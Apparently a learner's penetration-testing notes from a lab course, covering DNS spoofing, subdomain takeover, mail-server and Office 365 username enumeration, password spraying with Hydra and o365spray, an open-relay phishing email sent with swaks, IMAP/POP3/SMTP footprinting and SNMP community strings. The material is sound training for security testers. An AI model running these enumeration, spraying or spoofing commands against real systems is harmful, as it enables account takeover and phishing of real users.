    > After a successful DNS spoof attack, if a victim user coming from the target machine 192.168.152.129 visits the inlanefreight.com domain on a web browser, they will be redirected to a Fake page that is hosted on IP address 192.168.225.110:
    > In addition, a ping coming from the target IP address 192.168.152.129 to inlanefreight.com should be resolved to 192.168.225.110 as well:
    > Local DNS Cache Poisoning
        C:\>ping inlanefreight.com
        
        Pinging inlanefreight.com [192.168.225.110] with 32 bytes of data:
        Reply from 192.168.225.110: bytes=32 time<1ms TTL=64
        Reply from 192.168.225.110: bytes=32 time<1ms TTL=64
        Reply from 192.168.225.110: bytes=32 time<1ms TTL=64
        Reply from 192.168.225.110: bytes=32 time<1ms TTL=64
        
        Ping statistics for 192.168.225.110:
            Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
        Approximate round trip times in milli-seconds:
            Minimum = 0ms, Maximum = 0ms, Average = 0ms

[+] Latest DNS vulnerabilities
    > We can find thousands of subdomains and domains on the web. Often they point to no longer active third-party service providers such as AWS, GitHub, and others and, at best, display an error message as confirmation of a deactivated third-party service. Large companies and corporations are also affected time and again. Companies often cancel services from third-party providers but forget to delete the associated DNS records. This is because no additional costs are incurred for a DNS entry. Many well-known bug bounty platforms, such as HackerOne, already explicitly list Subdomain Takeover as a bounty category. With a simple search, we can find several tools on GitHub, for example, that automate the discovery of vulnerable subdomains or help create Proof of Concepts (PoC) that can then be submitted to the bug bounty program of our choice or the affected company. RedHuntLabs did a study on this in 2020, and they found that over 400,000 subdomains out of 220 million were vulnerable to subdomain takeover. 62% of them belonged to the e-commerce sector.
    + The Concept of the Attack
        - One of the biggest dangers of a subdomain takeover is that a phishing campaign can be launched that is considered part of the official domain of the target company. For example, customers would look at the link and see that the domain customer-drive.inlanefreight.com (which points to a nonexisting S3 bucket from AWS) is behind the official domain inlanefreight.com and trust it as a customer. However, the customers do not know that this page has been mirrored or created by an attacker to provoke a login by the company's customers, for example.
        - Therefore, if an attacker finds a CNAME record in the company's DNS records that points to a subdomain that no longer exists and returns an HTTP 404 error, this subdomain can most likely be taken over by us through the use of the third-party provider. A subdomain takeover occurs when a subdomain points to another domain using the CNAME record that does not currently exist. When an attacker registers this nonexistent domain, the subdomain points to the domain registration by us. By making a single DNS change, we make ourselves the owner of that particular subdomain, and after that, we can manage the subdomain as we choose.
        - What happens here is that the existing subdomain no longer points to a third-party provider and is therefore no longer occupied by this provider. Pretty much anyone can register this subdomain as their own. Visiting this subdomain and the presence of the CNAME record in the company's DNS leads, in most cases, to things working as expected. However, the design and function of this subdomain are in the hands of the attacker.

####Email Services
Host - MX Records
    m1l0js@htb[/htb]$ host -t MX hackthebox.eu
    hackthebox.eu mail is handled by 1 aspmx.l.google.com.

Host - MX Records
    m1l0js@htb[/htb]$ host -t MX microsoft.com
    microsoft.com mail is handled by 10 microsoft-com.mail.protection.outlook.com.

DIG - MX Records
    m1l0js@htb[/htb]$ dig mx plaintext.do | grep "MX" | grep -v ";"
    plaintext.do.           7076    IN      MX      50 mx3.zoho.com.
    plaintext.do.           7076    IN      MX      10 mx.zoho.com.
    plaintext.do.           7076    IN      MX      20 mx2.zoho.com.

DIG - MX Records
    m1l0js@htb[/htb]$ dig mx inlanefreight.com | grep "MX" | grep -v ";"
    inlanefreight.com.      300     IN      MX      10 mail1.inlanefreight.com.

DIG - A Record for MX
    m1l0js@htb[/htb]$ host -t A mail1.inlanefreight.htb.
    mail1.inlanefreight.htb has address 10.129.14.128

    > These MX records indicate that the first three mail services are using a cloud services G-Suite (aspmx.l.google.com), Microsoft 365 (microsoft-com.mail.protection.outlook.com), and Zoho (mx.zoho.com), and the last one may be a custom mail server hosted by the company.

    > This information is essential because the enumeration methods may differ from one service to another. For example, most cloud service providers use their mail server implementation and adopt modern authentication, which opens new and unique attack vectors for each service provider. On the other hand, if the company configures the service, we could uncover bad practices and misconfigurations that allow common attacks on mail server protocols.

    > If we are targetting a custom mail server implementation such as inlanefreight.htb, we can enumerate the following ports:
        Port 	    Service
        TCP/25 	    SMTP Unencrypted
        TCP/143 	IMAP4 Unencrypted
        TCP/110 	POP3 Unencrypted
        TCP/465 	SMTP Encrypted
        TCP/993 	IMAP4 Encrypted
        TCP/995 	POP3 Encrypted
[+] Misconfigurations
    * Authentication
        > The SMTP server has different commands that can be used to enumerate valid usernames VRFY, EXPN, and RCPT TO. If we successfully enumerate valid usernames, we can attempt to password spray, brute-forcing, or guess a valid password. So let's explore how those commands work.
        > VRFY this command instructs the receiving SMTP server to check the validity of a particular email username. The server will respond, indicating if the user exists or not. This feature can be disabled.
        > VRFY Command
            m1l0js@htb[/htb]$ telnet 10.10.110.20 25
            VRFY root
            252 2.0.0 root
            VRFY www-data
            252 2.0.0 www-data
            VRFY new-user
            550 5.1.1 <new-user>: Recipient address rejected: User unknown in local recipient table
        > EXPN is similar to VRFY, except that when used with a distribution list, it will list all users on that list. This can be a bigger problem than the VRFY command since sites often have an alias such as "all."
        > EXPN Command
            m1l0js@htb[/htb]$ telnet 10.10.110.20 25
            EXPN john
            250 2.1.0 john@inlanefreight.htb
            EXPN support-team
            250 2.0.0 carol@inlanefreight.htb
            250 2.1.5 elisa@inlanefreight.htb

        > RCPT TO identifies the recipient of the email message. This command can be repeated multiple times for a given message to deliver a single message to multiple recipients.
        > RCPT TO Command
            m1l0js@htb[/htb]$ telnet 10.10.110.20 25
            MAIL FROM:test@htb.com
            it is
            250 2.1.0 test@htb.com... Sender ok
            RCPT TO:julio
            550 5.1.1 julio... User unknown
            RCPT TO:kate
            550 5.1.1 kate... User unknown
            RCPT TO:john
            250 2.1.5 john... Recipient ok

        > We can also use the POP3 protocol to enumerate users depending on the service implementation. For example, we can use the command USER followed by the username, and if the server responds OK. This means that the user exists on the server.
        > USER Command
            m1l0js@htb[/htb]$ telnet 10.10.110.20 110
            USER julio
            -ERR
            
            USER john
            +OK

    + To automate our enumeration process, we can use a tool named smtp-user-enum(https://github.com/pentestmonkey/smtp-user-enum). We can specify the enumeration mode with the argument -M followed by VRFY, EXPN, or RCPT, and the argument -U with a file containing the list of users we want to enumerate. Depending on the server implementation and enumeration mode, we need to add the domain for the email address with the argument -D. Finally, we specify the target with the argument -t.
        > USER Command
            m1l0js@htb[/htb]$ smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7

[+] Cloud Enumeration

    > As discussed, cloud service providers use their own implementation for email services. Those services commonly have custom features that we can abuse for operation, such as username enumeration. Let's use Office 365 as an example and explore how we can enumerate usernames in this cloud platform.

    > O365spray(https://github.com/0xZDH/o365spray) is a username enumeration and password spraying tool aimed at Microsoft Office 365 (O365) developed by ZDH. This tool reimplements a collection of enumeration and spray techniques researched and identified by those mentioned in Acknowledgments. Let's first validate if our target domain is using Office 365.
    > O365 Spray
        m1l0js@htb[/htb]$ python3 o365spray.py --validate --domain msplaintext.xyz

    > Now, we can attempt to identify usernames.
    > O365 Spray
        m1l0js@htb[/htb]$ python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz        
[+] Password Attacks

    > We can use Hydra to perform a password spray or brute force against email services such as SMTP, POP3, or IMAP4. First, we need to get a username list and a password list and specify which service we want to attack. Let us see an example for POP3.
    > Hydra - Password Attack
        m1l0js@htb[/htb]$ hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3

    > If cloud services support SMTP, POP3, or IMAP4 protocols, we may be able to attempt to perform password spray using tools like Hydra, but these tools are usually blocked. We can instead try to use custom tools such as o365spray(https://github.com/0xZDH/o365spray) or MailSniper(https://github.com/dafthack/MailSniper) for Microsoft Office 365 or CredKing(https://github.com/ustayready/CredKing) for Gmail or Okta. Keep in mind that these tools need to be up-to-date because if the service provider changes something (which happens often), the tools may not work anymore. This is a perfect example of why we must understand what our tools are doing and have the know-how to modify them if they do not work properly for some reason.
    > O365 Spray - Password Spraying
        m1l0js@htb[/htb]$ python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz

[+] Protocol Specifics Attacks
    > An open relay is a Simple Transfer Mail Protocol (SMTP) server, which is improperly configured and allows an unauthenticated email relay. Messaging servers that are accidentally or intentionally configured as open relays allow mail from any source to be transparently re-routed through the open relay server. This behavior masks the source of the messages and makes it look like the mail originated from the open relay server.
    > From an attacker's standpoint, we can abuse this for phishing by sending emails as non-existing users or spoofing someone else's email. For example, imagine we are targeting an enterprise with an open relay mail server, and we identify they use a specific email address to send notifications to their employees. We can send a similar email using the same address and add our phishing link with this information. With the nmap smtp-open-relay script, we can identify if an SMTP port allows an open relay.
    > Open Relay
        m1l0js@htb[/htb]# nmap -p25 -Pn --script smtp-open-relay 10.10.11.213
    > Next, we can use any mail client to connect to the mail server and send our email.
    > Open Relay
        m1l0js@htb[/htb]# swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213

=== Trying 10.10.11.213:25...
=== Connected to 10.10.11.213.
<-  220 mail.localdomain SMTP Mailer ready
 -> EHLO parrot
<-  250-mail.localdomain
<-  250-SIZE 33554432
<-  250-8BITMIME
<-  250-STARTTLS
<-  250-AUTH LOGIN PLAIN CRAM-MD5 CRAM-SHA1
<-  250 HELP
 -> MAIL FROM:<notifications@inlanefreight.com>
<-  250 OK
 -> RCPT TO:<employees@inlanefreight.com>
<-  250 OK
 -> DATA
<-  354 End data with <CR><LF>.<CR><LF>
 -> Date: Thu, 29 Oct 2020 01:36:06 -0400
 -> To: employees@inlanefreight.com
 -> From: notifications@inlanefreight.com
 -> Subject: Company Notification
 -> Message-Id: <20201029013606.775675@parrot>
 -> X-Mailer: swaks v20190914.0 jetmore.org/john/code/swaks/
 -> 
 -> Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/
 -> 
 -> 
 -> .
<-  250 OK
 -> QUIT
<-  221 Bye
=== Connection closed with remote host.




####SMTP
[+] Process
  > The Simple Mail Transfer Protocol (SMTP) is a protocol for sending emails in an IP network. It can be used between an email client and an outgoing mail server or between two SMTP servers. SMTP is often combined with the IMAP or POP3 protocols, which can fetch emails and send emails. In principle, it is a client-server-based protocol, although SMTP can be used between a client and a server and between two SMTP servers. In this case, a server effectively acts as a client.

  > By default, SMTP servers accept connection requests on port 25. However, newer SMTP servers also use other ports such as TCP port 587. This port is used to receive mail from authenticated users/servers, usually using the STARTTLS command to switch the existing plaintext connection to an encrypted connection. The authentication data is protected and no longer visible in plaintext over the network. At the beginning of the connection, authentication occurs when the client confirms its identity with a user name and password. The emails can then be transmitted. For this purpose, the client sends the server sender and recipient addresses, the email's content, and other information and parameters. After the email has been transmitted, the connection is terminated again. The email server then starts sending the email to another SMTP server.

  > SMTP works unencrypted without further measures and transmits all commands, data, or authentication information in plain text. To prevent unauthorized reading of data, the SMTP is used in conjunction with SSL/TLS encryption. Under certain circumstances, a server uses a port other than the standard TCP port 25 for the encrypted connection, for example, TCP port 465.

  > An essential function of an SMTP server is preventing spam using authentication mechanisms that allow only authorized users to send e-mails. For this purpose, most modern SMTP servers support the protocol extension ESMTP with SMTP-Auth. After sending his e-mail, the SMTP client, also known as Mail User Agent (MUA), converts it into a header and a body and uploads both to the SMTP server. This has a so-called Mail Transfer Agent (MTA), the software basis for sending and receiving e-mails. The MTA checks the e-mail for size and spam and then stores it. To relieve the MTA, it is occasionally preceded by a Mail Submission Agent (MSA), which checks the validity, i.e., the origin of the e-mail. This MSA is also called Relay server. These are very important later on, as the so-called Open Relay Attack can be carried out on many SMTP servers due to incorrect configuration. We will discuss this attack and how to identify the weak point for it a little later. The MTA then searches the DNS for the IP address of the recipient mail server.

  > On arrival at the destination SMTP server, the data packets are reassembled to form a complete e-mail. From there, the Mail delivery agent (MDA) transfers it to the recipient's mailbox.

  Client(MUA) ==> Submission Agent(MSA) ==> Open Relay(MTA) ==> Mail Delivery Agent(MDA) ==> Mailbox(POP3/IMAP)

[+] Disadvantages
* But SMTP has two disadvantages inherent to the network protocol.

  > The first is that sending an email using SMTP does not return a usable delivery confirmation. Although the specifications of the protocol provide for this type of notification, its formatting is not specified by default, so that usually only an English-language error message, including the header of the undelivered message, is returned.

  > Users are not authenticated when a connection is established, and the sender of an email is therefore unreliable. As a result, open SMTP relays are often misused to send spam en masse. The originators use arbitrary fake sender addresses for this purpose to not be traced (mail spoofing). Today, many different security techniques are used to prevent the misuse of SMTP servers. For example, suspicious emails are rejected or moved to quarantine (spam folder). For example, responsible for this are the identification protocol DomainKeys (DKIM), the Sender Policy Framework (SPF).

* For this purpose, an extension for SMTP has been developed called Extended SMTP (ESMTP). When people talk about SMTP in general, they usually mean ESMTP. ESMTP uses TLS, which is done after the EHLO command by sending STARTTLS. This initializes the SSL-protected SMTP connection, and from this moment on, the entire connection is encrypted, and therefore more or less secure. Now AUTH PLAIN(https://www.samlogic.net/articles/smtp-commands-reference-auth.htm) extension for authentication can also be used safely.

[+] Default configuration
  cat /etc/postfix/main.cf | grep -v "#" | sed -r "/^\s*$/d"

  Command	      Description
    AUTH PLAIN	AUTH is a service extension used to authenticate the client.
    HELO	      The client logs in with its computer name and thus starts the session.
    EHLO        Is an alternative to HELO for servers that support the SMTP service extensions (ESMTP). If the server does not support ESMTP, it will reply with an error. 
    MAIL FROM	  The client names the email sender.
    RCPT TO	    The client names the email recipient.
    DATA	      The client initiates the transmission of the email.
    RSET	      The client aborts the initiated transmission but keeps the connection between client and server.
    VRFY	      The client checks if a mailbox is available for message transfer.
    EXPN	      The client also checks if a mailbox is available for messaging with this command.
    NOOP	      The client requests a response from the server to prevent disconnection due to time-out.
    QUIT	      The client terminates the session.
  
* To interact with the SMTP server, we can use the telnet tool to initialize a TCP connection with the SMTP server. The actual initialization of the session is done with the command mentioned above, HELO or EHLO.
  telnet 10.192.12.29 25
* The command VRFY can be used to enumerate existing users on the system. However, this does not always work. Depending on how the SMTP server is configured, the SMTP server may issue code 252 and confirm the existence of a user that does not exist on the system. A list of all SMTP response codes can be found here ==> https://serversmtp.com/smtp-error/

* Sometimes we may have to work through a web proxy. We can also make this web proxy connect to the SMTP server. The command that we would send than would look something like this: CONNECT 10.129.14.128:25 HTTP/1.0
* Send an email
    MAIL FROM: <cry0l1t3@inlanefreight.htb>
    250 2.1.0 Ok
    RCPT TO: <mrb3n@inlanefreight.htb> NOTIFY=success,failure
    250 2.1.5 Ok
    DATA
    354 End data with <CR><LF>.<CR><LF>
    From: <cry0l1t3@inlanefreight.htb>
    To: <mrb3n@inlanefreight.htb>
    Subject: DB
    Date: Tue, 28 Sept 2021 16:32:51 +0200
    Hey man, I am trying to access our XY-DB but the creds don't work. 
    Did you make any changes there?
    .
    
    250 2.0.0 Ok: queued as 6E1CF1681AB
    QUIT
    221 2.0.0 Bye
    Connection closed by foreign host.
  
[+] Dangerous settings
  > To prevent the sent emails from being filtered by spam filters and not reaching the recipient, the sender can use a relay server that the recipient trusts. It is an SMTP server that is known and verified by all others. As a rule, the sender must authenticate himself to the relay server before using it.

  > Often, administrators have no overview of which IP ranges they have to allow. This results in a misconfiguration of the SMTP server that we will still often find in external and internal penetration tests. Therefore, they allow all IP addresses not to cause errors in the email traffic and thus not to disturb or unintentionally interrupt the communication with potential and current customers.
  > Open Relay configuration ==> With this setting, this SMTP server can send fake emails and thus initialize communication between multiple parties. Another attack possibility would be to spoof the email and read it.
    mynetworks = 0.0.0.0/0
[+] Footprinting the service
  > The default Nmap scripts include smtp-commands, which uses the EHLO command to list all possible commands that can be executed on the target SMTP server.
    sudo nmap 10.129.14.128 -sC -sV -p25
  > However, we can also use the smtp-open-relay NSE script to identify the target SMTP server as an open relay using 16 different tests. If we also print out the output of the scan in detail, we will also be able to see which tests the script is running.
    sudo nmap 10.129.14.128 -p25 --script smtp-open-relay -v
[+] Brute forcing users
    smtp-user-enum -M VRFY -U footprinting-wordlist.txt -m 1 -D inlanefreight.htb -t 10.129.60.147 -t 10 -v

####IMAP/POP3
* With the help of the Internet Message Access Protocol (IMAP), access to emails from a mail server is possible. Unlike the Post Office Protocol (POP3), IMAP allows online management of emails directly on the server and supports folder structures. Thus, it is a network protocol for the online management of emails on a remote server. The protocol is client-server-based and allows synchronization of a local email client with the mailbox on the server, providing a kind of network file system for emails, allowing problem-free synchronization across several independent clients. POP3, on the other hand, does not have the same functionality as IMAP, and it only provides listing, retrieving, and deleting emails as functions at the email server. Therefore, protocols such as IMAP must be used for additional functionalities such as hierarchical mailboxes directly at the mail server, access to multiple mailboxes during a session, and preselection of emails.

* Clients access these structures online and can create local copies. Even across several clients, this results in a uniform database. Emails remain on the server until they are deleted. IMAP is text-based and has extended functions, such as browsing emails directly on the server. It is also possible for several users to access the email server simultaneously. Without an active connection to the server, managing emails is impossible. However, some clients offer an offline mode with a local copy of the mailbox. The client synchronizes all offline local changes when a connection is reestablished.

* The client establishes the connection to the server via port 143. For communication, it uses text-based commands in ASCII format. Several commands can be sent in succession without waiting for confirmation from the server. Later confirmations from the server can be assigned to the individual commands using the identifiers sent along with the commands. Immediately after the connection is established, the user is authenticated by user name and password to the server. Access to the desired mailbox is only possible after successful authentication.

* SMTP is usually used to send emails. By copying sent emails into an IMAP folder, all clients have access to all sent mails, regardless of the computer from which they were sent. Another advantage of the Internet Message Access Protocol is creating personal folders and folder structures in the mailbox. This feature makes the mailbox clearer and easier to manage. However, the storage space requirement on the email server increases.

* Without further measures, IMAP works unencrypted and transmits commands, emails, or usernames and passwords in plain text. Many email servers require establishing an encrypted IMAP session to ensure greater security in email traffic and prevent unauthorized access to mailboxes. SSL/TLS is usually used for this purpose. Depending on the method and implementation used, the encrypted connection uses the standard port 143 or an alternative port such as 993.

[+] Default configuration
  > Both IMAP and POP3 have a large number of configuration options, making it difficult to deep dive into each component in more detail. If you wish to examine these protocol configurations deeper, we recommend creating a VM locally and install the two packages dovecot-imapd, and dovecot-pop3d using apt and play around with the configurations and experiment.

  > In the documentation of Dovecot, we can find the individual core settings(https://doc.dovecot.org/settings/core/) and service(https://doc.dovecot.org/configuration_manual/service_configuration/) configuration options that can be utilized for our experiments. However, let us look at the list of commands and see how we can directly interact and communicate with IMAP and POP3 using the command line.

  > IMAP Command	                        Description
    n namespace                     The namespace should be the first command issued, as it will return the prefix and hierarchy delimiter to the Personal Namespace(s), Other Users’ Namespace(s) and Shared Namespace(s) that the server wishes to expose.
    1 LOGIN username password	      User's login.
    1 LIST "" *	                    Lists all directories.
    1 CREATE "INBOX"	              Creates a mailbox with a specified name.
    1 DELETE "INBOX"	              Deletes a mailbox.
    1 RENAME "ToRead" "Important"	  Renames a mailbox.
    1 LSUB "" *	                    Returns a subset of names from the set of names that the User has declared as being active or subscribed.
    1 SELECT INBOX	                Selects a mailbox so that messages in the mailbox can be accessed.
    1 UNSELECT INBOX	              Exits the selected mailbox.
    1 FETCH <ID> all	              Retrieves data associated with a message in the mailbox.
    1 CLOSE	                        Removes all messages with the Deleted flag set.
    1 LOGOUT	                      Closes the connection with the IMAP server.

  > POP3 Commands
    Command	        Description
    USER username	  Identifies the user.
    PASS password	  Authentication of the user using its password.
    STAT	          Requests the number of saved emails from the server.
    LIST	          Requests from the server the number and size of all emails.
    RETR id	        Requests the server to deliver the requested email by ID.
    DELE id	        Requests the server to delete the requested email by ID.
    CAPA	          Requests the server to display the server capabilities.
    RSET	          Requests the server to reset the transmitted information.
    QUIT	          Closes the connection with the POP3 server.

[+] Dangerous settings
* Nevertheless, configuration options that were improperly configured could allow us to obtain more information, such as debugging the executed commands on the service or logging in as anonymous, similar to the FTP service. Most companies use third-party email providers such as Google, Microsoft, and many others. However, some companies still use their own mail servers for many different reasons. One of these reasons is to maintain the privacy that they want to keep in their own hands. Many configuration mistakes can be made by administrators, which in the worst cases will allow us to read all the emails sent and received, which may even contain confidential or sensitive information. Some of these configuration options include:

  > Setting	                Description
    auth_debug	            Enables all authentication debug logging.
    auth_debug_passwords	  This setting adjusts log verbosity, the submitted passwords, and the scheme gets logged.
    auth_verbose	          Logs unsuccessful authentication attempts and their reasons.
    auth_verbose_passwords	Passwords used for authentication are logged and can also be truncated.
    auth_anonymous_username	This specifies the username to be used when logging in with the ANONYMOUS SASL mechanism.

[+] Footprinting the service
  > By default, ports 110, 143, 993, and 995 are used for IMAP and POP3. The two higher ports use TLS/SSL to encrypt the communication between client and server. 
     sudo nmap 10.129.14.128 -sV -p110,143,993,995 -sC
  > If we successfully figure out the access credentials for one of the employees, an attacker could log in to the mail server and read or even send the individual messages.
     curl -k 'imaps://10.129.14.128' --user user:p4ssw0rd
  > If we also use the verbose (-v) option, we will see how the connection is made. From this, we can see the version of TLS used for encryption, further details of the SSL certificate, and even the banner, which will often contain the version of the mail server
    curl -k 'imaps://10.129.14.128' --user cry0l1t3:1234 -v
  > To interact with the IMAP or POP3 server over SSL, we can use openssl, as well as ncat. The commands for this would look like this:
    * Interaction POP3
        openssl s_client -connect 10.129.14.128:pop3s
    * Interaction IMAP
        openssl s_client -connect 10.129.14.128:imaps -crlf -quiet
          The option “-crlf” just means to issue a carriage return and a line feed on enter and “-quiet” means not to spit out a bunch of details about the encrypted channel
          Feel free to drop “-quiet” to view the output, or if you are keen, add “-debug” for even more detail.
        > A Note on TLS
            Some IMAP installations offer a TLS method of connection, with the STARTTLS command, on the cleartext port 143. But if you do want to know how to connect to an IMAP service that does offer STARTTLS, the easiest way to do this is to use OpenSSL s_client again, as follows:
              openssl s_client -connect server.domain.tld:143 -crlf -quiet -starttls imap
      > To actually perform actions against an IMAP server, you typically need to authenticate.  There are three ways to authenticate:
          login
          SASL AUTH LOGIN
          SASL AUTH PLAIN
      > A1 LIST "DEV.DEPARTMENT.INT/" "*"
      > 1 SELECT "DEV.DEPARTMENT.INT"
      > _ FETCH 1 (BODY[TEXT])
      > _ FETCH 1 ALL

      Login
    A1 LOGIN username password
Values can be quoted to enclose spaces and special characters. A " must then be escape with a \
    A1 LOGIN "username" "password"

List Folders/Mailboxes
    A1 LIST "" *
    A1 LIST INBOX *
    A1 LIST "Archive" *

Create new Folder/Mailbox
    A1 CREATE INBOX.Archive.2012
    A1 CREATE "To Read"

Delete Folder/Mailbox
    A1 DELETE INBOX.Archive.2012
    A1 DELETE "To Read"

Rename Folder/Mailbox
    A1 RENAME "INBOX.One" "INBOX.Two"

List Subscribed Mailboxes
    A1 LSUB "" *

Status of Mailbox (There are more flags than the ones listed)
    A1 STATUS INBOX (MESSAGES UNSEEN RECENT)

Select a mailbox
    A1 SELECT INBOX

List messages
    A1 FETCH 1:* (FLAGS)
    A1 UID FETCH 1:* (FLAGS)

Retrieve Message Content
    A1 FETCH 2 body[text]
    A1 FETCH 2 all
    A1 UID FETCH 102 (UID RFC822.SIZE BODY.PEEK[])

Close Mailbox
    A1 CLOSE

Logout
    A1 LOGOUT

[+] URLs
  https://www.atmail.com/blog/imap-101-manual-imap-sessions/
  https://www.atmail.com/blog/imap-commands/
  https://explained-from-first-principles.com/email/#internal-date
  https://book.hacktricks.xyz/network-services-pentesting/pentesting-pop
  https://book.hacktricks.xyz/network-services-pentesting/pentesting-imap


[+] Latest email service vulnerabilities
    > One of the most recent publicly disclosed and dangerous Simple Mail Transfer Protocol (SMTP) vulnerabilities was discovered in OpenSMTPD up to version 6.6.2 service was in 2020. This vulnerability was assigned CVE-2020-7247 and leads to RCE. It has been exploitable since 2018. This service has been used in many different Linux distributions, such as Debian, Fedora, FreeBSD, and others. The dangerous thing about this vulnerability is the possibility of executing system commands remotely on the system and that exploiting this vulnerability does not require authentication.
    > According to Shodan.io, at the time of writing (April 2022), there are over 5,000 publicly accessible OpenSMTPD servers worldwide, and the trend is growing. However, this does not mean that this vulnerability affects every service. Instead, we want to show you how significant the impact of an RCE would be in case this vulnerability were discovered now. However, of course, this applies to all other services as well.
        product:"OpenSMTPD"
    > The Concept of the Attack
        + As we already know, with the SMTP service, we can compose emails and send them to desired people. The vulnerability in this service lies in the program's code, namely in the function that records the sender's email address. This offers the possibility of escaping the function using a semicolon (;) and making the system execute arbitrary shell commands. However, there is a limit of 64 characters, which can be inserted as a command. The technical details of this vulnerability can be found here ==> (https://www.openwall.com/lists/oss-security/2020/01/28/3)
        + Here we need to initialize a connection with the SMTP service first. This can be automated by a script or entered manually. After the connection is established, an email must be composed in which we define the sender, the recipient, and the actual message for the recipient. The desired system command is inserted in the sender field connected to the sender address with a semicolon (;). As soon as we finish writing, the data entered is processed by the OpenSMTPD process.
        + An exploit(https://www.exploit-db.com/exploits/47984) has been published on the Exploit-DB platform for this vulnerability which can be used for more detailed analysis and the functionality of the trigger for the execution of system commands.
    
[+] Next steps
    > There are other ways to attack email services that can be very effective as well. A few Hack The Box boxes demonstrate email attacks, such as Rabbit, which deals with brute-forcing Outlook Web Access (OWA) and then sending a document with a malicious macro to phish a user, SneakyMailer which has elements of phishing and enumerating a user's inbox using Netcat and an IMAP client, and Reel which dealt with brute-forcing SMTP users and phishing with a malicious RTF file.

    > It's worth playing these boxes, or at least watching the Ippsec video or reading a walkthrough to see examples of these attacks in action. This goes for any attack demonstrated in this module (or others). The site ippsec.rocks can be used to search for common terms and will show which HTB boxes these appear in, which will reveal a wealth of targets to practice against.


####SNMP
* Simple Network Management Protocol (SNMP) was created to monitor network devices. In addition, this protocol can also be used to handle configuration tasks and change settings remotely. SNMP-enabled hardware includes routers, switches, servers, IoT devices, and many other devices that can also be queried and controlled using this standard protocol. Thus, it is a protocol for monitoring and managing network devices. In addition, configuration tasks can be handled, and settings can be made remotely using this standard. The current version is SNMPv3, which increases the security of SNMP in particular, but also the complexity of using this protocol.

* In addition to the pure exchange of information, SNMP also transmits control commands using agents over UDP port 161. The client can set specific values in the device and change options and settings with these commands. While in classical communication, it is always the client who actively requests information from the server, SNMP also enables the use of so-called traps over UDP port 162. These are data packets sent from the SNMP server to the client without being explicitly requested. If a device is configured accordingly, an SNMP trap is sent to the client once a specific event occurs on the server-side.

* For the SNMP client and server to exchange the respective values, the available SNMP objects must have unique addresses known on both sides. This addressing mechanism is an absolute prerequisite for successfully transmitting data and network monitoring using SNMP.

[+] MIB
  > To ensure that SNMP access works across manufacturers and with different client-server combinations, the Management Information Base (MIB) was created. MIB is an independent format for storing device information. A MIB is a text file in which all queryable SNMP objects of a device are listed in a standardized tree hierarchy. It contains at least one Object Identifier (OID), which, in addition to the necessary unique address and a name, also provides information about the type, access rights, and a description of the respective object. MIB files are written in the Abstract Syntax Notation One (ASN.1) based ASCII text format. The MIBs do not contain data, but they explain where to find which information and what it looks like, which returns values for the specific OID, or which data type is used.

[+] OID
  > An OID represents a node in a hierarchical namespace. A sequence of numbers uniquely identifies each node, allowing the node's position in the tree to be determined. The longer the chain, the more specific the information. Many nodes in the OID tree contain nothing except references to those below them. The OIDs consist of integers and are usually concatenated by dot notation. We can look up many MIBs for the associated OIDs in the Object Identifier Registry.

[+] SNMPv1
  > SNMP version 1 (SNMPv1) is used for network management and monitoring. SNMPv1 is the first version of the protocol and is still in use in many small networks. It supports the retrieval of information from network devices, allows for the configuration of devices, and provides traps, which are notifications of events. However, SNMPv1 has no built-in authentication mechanism, meaning anyone accessing the network can read and modify network data. Another main flaw of SNMPv1 is that it does not support encryption, meaning that all data is sent in plain text and can be easily intercepted.

[+] SNMPv2
  > SNMPv2 existed in different versions. The version still exists today is v2c, and the extension c means community-based SNMP. Regarding security, SNMPv2 is on par with SNMPv1 and has been extended with additional functions from the party-based SNMP no longer in use. However, a significant problem with the initial execution of the SNMP protocol is that the community string that provides security is only transmitted in plain text, meaning it has no built-in encryption.


[+] SNMPv3
  > The security has been increased enormously for SNMPv3 by security features such as authentication using username and password and transmission encryption (via pre-shared key) of the data. However, the complexity also increases to the same extent, with significantly more configuration options than v2c.

[+] Community Strings
  > Community strings can be seen as passwords that are used to determine whether the requested information can be viewed or not. It is important to note that many organizations are still using SNMPv2, as the transition to SNMPv3 can be very complex, but the services still need to remain active. This causes many administrators a great deal of concern and creates some problems they are keen to avoid. The lack of knowledge about how the information can be obtained and how we as attackers use it makes the administrators' approach seem inexplicable. At the same time, the lack of encryption of the data sent is also a problem. Because every time the community strings are sent over the network, they can be intercepted and read.

  > Other explanation: SNMP Community strings provide information and statistics about a router or device, helping us gain access to it. The manufacturer default community strings of public and private are often unchanged. In SNMP versions 1 and 2c, access is controlled using a plaintext community string, and if we know the name, we can gain access to it. Encryption and authentication were only added in SNMP version 3. Much information can be gained from SNMP. Examination of process parameters might reveal credentials passed on the command line, which might be possible to reuse for other externally accessible services given the prevalence of password reuse in enterprise environments. Routing information, services bound to additional interfaces, and the version of installed software can also be revealed.
  > The are 2 types of community strings:
    public mainly read only functions
    private Read/Write in general
  > Note that the writability of an OID depends on the community string used, so even if you find that "public" is being used, you could be able to write some values. Also, there may exist objects which are always "Read Only". If you try to write an object a noSuchName or readOnly error is received, In versions 1 and 2/2c if you to use a bad community string the server wont respond. So, if it responds, a valid community strings was used.

[+] Default configuration 
  > The configuration of this service can also be changed in many ways. Therefore, we recommend setting up a VM to install and configure the SNMP server ourselves. All the settings that can be made for the SNMP daemon are defined and described in the manpage ==> http://www.net-snmp.org/docs/man/snmpd.conf.html

    cat /etc/snmp/snmpd.conf | grep -v "#" | sed -r '/^\s*$/d'
[+] Dangerous settings
  Settings	                                      Description
  rwuser noauth	                                  Provides access to the full OID tree without authentication.
  rwcommunity <community string> <IPv4 address>	  Provides access to the full OID tree regardless of where the requests were sent from.
  rwcommunity6 <community string> <IPv6 address>	Same access as with rwcommunity with the difference of using IPv6.

[+] Footprinting the service
  > For footprinting SNMP, we can use tools like snmpwalk, onesixtyone, and braa. Snmpwalk is used to query the OIDs with their information. Onesixtyone can be used to brute-force the names of the community strings since they can be named arbitrarily by the administrator. Since these community strings can be bound to any source, identifying the existing community strings can take quite some time

